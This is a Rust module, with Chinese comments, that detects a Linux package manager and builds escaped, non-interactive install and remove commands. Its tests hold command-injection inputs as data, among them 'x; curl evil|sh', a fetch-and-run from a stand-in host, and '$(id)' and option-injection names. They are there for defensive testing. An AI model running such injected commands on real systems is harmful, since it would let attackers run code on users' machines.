//! Linux 包管理器身份 + 非交互命令拼装;组件与 runtime 只认这一个枚举
//!
//! 提权不在这里拼:调用方按需给返回的 HostCommand 打 .elevated(),Host 层决定
//! sudo -S / sudo -n。apt 一律带 DEBIAN_FRONTEND=noninteractive,否则 dpkg 的
//! 配置弹窗会把 SSH 会话卡死。

use std::time::Duration;

use crate::command::HostCommand;
use crate::host::Host;
use crate::shell::{BashShell, HostShell};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum LinuxPackageManager {
    Apt,
    Dnf,
    Yum,
    Apk,
    Pacman,
}

impl LinuxPackageManager {
    /// 探测顺序即优先级:同机装了 dnf 和 yum 时用 dnf
    pub const ALL: &'static [Self] = &[Self::Apt, Self::Dnf, Self::Yum, Self::Apk, Self::Pacman];

    pub async fn detect(host: &dyn Host) -> Option<Self> {
        for pm in Self::ALL {
            if host.command_exists(pm.binary()).await {
                return Some(*pm);
            }
        }
        None
    }

    pub fn binary(self) -> &'static str {
        match self {
            Self::Apt => "apt-get",
            Self::Dnf => "dnf",
            Self::Yum => "yum",
            Self::Apk => "apk",
            Self::Pacman => "pacman",
        }
    }

    /// 刷新索引的 shell 片段;None 表示该管理器装包时自己会刷(dnf / pacman -Sy)
    pub fn refresh_script(self) -> Option<&'static str> {
        match self {
            Self::Apt => Some("apt-get update"),
            Self::Apk => Some("apk update"),
            Self::Dnf | Self::Yum | Self::Pacman => None,
        }
    }

    /// 包名只收发行版仓库里会出现的字符。首字符必须是字母或数字：引号挡得住 shell 注入，
    /// 挡不住 `-o ...` 这种被 apt / dnf 当成选项的名字，从前端传进来的包名要先过这一关
    pub fn is_valid_package_name(name: &str) -> bool {
        let mut chars = name.chars();
        matches!(chars.next(), Some(c) if c.is_ascii_alphanumeric())
            && chars.all(|c| {
                c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-' | ':' | '@' | '=' | '~')
            })
    }

    /// 非交互安装的 shell 片段
    pub fn install_script(self, packages: &[&str]) -> String {
        let pkgs = join_packages(packages);
        match self {
            Self::Apt => format!("DEBIAN_FRONTEND=noninteractive apt-get install -y -qq {pkgs}"),
            Self::Dnf => format!("dnf install -y {pkgs}"),
            Self::Yum => format!("yum install -y {pkgs}"),
            Self::Apk => format!("apk add --no-cache {pkgs}"),
            Self::Pacman => format!("pacman -Sy --noconfirm --needed {pkgs}"),
        }
    }

    /// 刷完索引接着装,一条 sh -c 跑完。全新机器上 apt / apk 还没有包索引,不先刷会找不到包;
    /// 装包时自己会刷的管理器只剩安装那一句
    pub fn refresh_and_install_script(self, packages: &[&str]) -> String {
        let install = self.install_script(packages);
        match self.refresh_script() {
            Some(refresh) => format!("{refresh} && {install}"),
            None => install,
        }
    }

    pub fn remove_script(self, packages: &[&str]) -> String {
        let pkgs = join_packages(packages);
        match self {
            Self::Apt => format!("DEBIAN_FRONTEND=noninteractive apt-get remove -y {pkgs}"),
            Self::Dnf => format!("dnf remove -y {pkgs}"),
            Self::Yum => format!("yum remove -y {pkgs}"),
            Self::Apk => format!("apk del {pkgs}"),
            Self::Pacman => format!("pacman -R --noconfirm {pkgs}"),
        }
    }

    /// 给用户手动执行看的一行(不带 sudo,由文案自己加)
    pub fn install_hint(self, packages: &[&str]) -> String {
        let pkgs = join_packages(packages);
        match self {
            Self::Apt => format!("apt-get install -y {pkgs}"),
            Self::Dnf => format!("dnf install -y {pkgs}"),
            Self::Yum => format!("yum install -y {pkgs}"),
            Self::Apk => format!("apk add {pkgs}"),
            Self::Pacman => format!("pacman -S {pkgs}"),
        }
    }

    /// `sh -c <refresh_script>`;None 同 refresh_script
    pub fn refresh_command(self) -> Option<HostCommand> {
        self.refresh_script()
            .map(|script| sh(script).timeout(Duration::from_secs(300)))
    }

    /// `sh -c <install_script>`,未提权
    pub fn install_command(self, packages: &[&str]) -> HostCommand {
        sh(&self.install_script(packages)).timeout(Duration::from_secs(600))
    }

    pub fn remove_command(self, packages: &[&str]) -> HostCommand {
        sh(&self.remove_script(packages)).timeout(Duration::from_secs(300))
    }
}

fn sh(script: &str) -> HostCommand {
    HostCommand::new("sh").arg("-c").arg(script)
}

// 整段脚本交给 sh -c 跑，还要带 sudo，每个包名都得单独成一个 token
fn join_packages(packages: &[&str]) -> String {
    packages
        .iter()
        .map(|p| BashShell.escape(p))
        .collect::<Vec<_>>()
        .join(" ")
}

impl std::fmt::Display for LinuxPackageManager {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.binary())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn apt_install_is_noninteractive_and_not_elevated_by_default() {
        let cmd = LinuxPackageManager::Apt.install_command(&["tar", "unzip"]);
        assert_eq!(cmd.program, "sh");
        let script = cmd.args.last().unwrap();
        assert!(script.starts_with("DEBIAN_FRONTEND=noninteractive apt-get install -y"));
        assert!(script.ends_with("tar unzip"));
        assert!(!cmd.elevated);
    }

    #[test]
    fn detection_order_prefers_apt_then_dnf_over_yum() {
        assert_eq!(LinuxPackageManager::ALL[0], LinuxPackageManager::Apt);
        let pos = |pm| LinuxPackageManager::ALL.iter().position(|p| *p == pm);
        assert!(pos(LinuxPackageManager::Dnf) < pos(LinuxPackageManager::Yum));
    }

    #[test]
    fn refresh_only_where_needed() {
        assert!(LinuxPackageManager::Apt.refresh_command().is_some());
        assert!(LinuxPackageManager::Dnf.refresh_command().is_none());
        assert!(LinuxPackageManager::Pacman.refresh_command().is_none());
    }

    #[test]
    fn refresh_and_install_refreshes_only_where_needed() {
        assert_eq!(
            LinuxPackageManager::Apt.refresh_and_install_script(&["unzip"]),
            "apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq unzip"
        );
        assert_eq!(
            LinuxPackageManager::Dnf.refresh_and_install_script(&["tar"]),
            "dnf install -y tar"
        );
        assert_eq!(
            LinuxPackageManager::Apk.refresh_and_install_script(&["unzip"]),
            "apk update && apk add --no-cache unzip"
        );
    }

    #[test]
    fn package_names_cannot_break_out_of_the_script() {
        let script = LinuxPackageManager::Apt.install_script(&["libnss3", "x; curl evil|sh"]);
        assert!(script.ends_with("libnss3 'x; curl evil|sh'"));
        let script = LinuxPackageManager::Dnf.remove_script(&["it's"]);
        assert!(script.ends_with("'it'\\''s'"));
    }

    #[test]
    fn package_name_validation() {
        for ok in ["libnss3", "libstdc++6", "libasound2t64", "gtk3:amd64", "py3-pip@edge", "nodejs=20.1-r0"] {
            assert!(LinuxPackageManager::is_valid_package_name(ok), "{ok}");
        }
        for bad in ["", "-oDebug::pkgProblemResolver=1", "a b", "a;b", "$(id)", "a/b", "../x"] {
            assert!(!LinuxPackageManager::is_valid_package_name(bad), "{bad}");
        }
    }

    #[test]
    fn hint_has_no_sudo() {
        for pm in LinuxPackageManager::ALL {
            assert!(!pm.install_hint(&["x"]).contains("sudo"));
        }
    }
}
